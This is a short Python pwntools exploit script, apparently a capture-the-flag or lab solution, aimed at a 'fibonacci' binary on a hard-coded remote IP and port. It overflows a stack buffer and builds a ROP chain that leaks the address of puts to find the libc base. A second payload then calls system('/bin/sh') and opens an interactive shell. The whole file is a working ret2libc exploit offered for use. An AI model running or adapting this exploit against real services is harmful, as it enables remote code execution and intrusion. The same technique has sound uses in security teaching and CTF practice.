from re import search
from pwn import *

BIN = './fibonacci'
# p = process(BIN)
p = remote('141.85.224.106', 31348)
elf = ELF(BIN)
rop = ROP(BIN)

# LIBC = '/lib/x86_64-linux-gnu/libc.so.6'
LIBC = './libc.so.6'
libc = ELF(LIBC)

buff_len = 32
rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

p.recvline()
payload1 = b'1000' + b'a' * (buff_len + 4) + p64(rdi) + p64(elf.got['puts']) \
	+ p64(elf.symbols['puts']) + p64(elf.symbols['main'])
p.sendline(payload1)

leak = p.recvline().rstrip()
puts = u64(leak + b'\x00' * (8 - len(leak)))
libc.address = puts - libc.symbols['puts']
bin_sh = next(libc.search(b'/bin/sh\x00'))

p.recvline()
payload2 = b'1000' + b'a' * (buff_len + 4) + p64(ret) + p64(rdi) + p64(bin_sh) \
	+ p64(libc.symbols['system'])
p.sendline(payload2)

p.interactive()
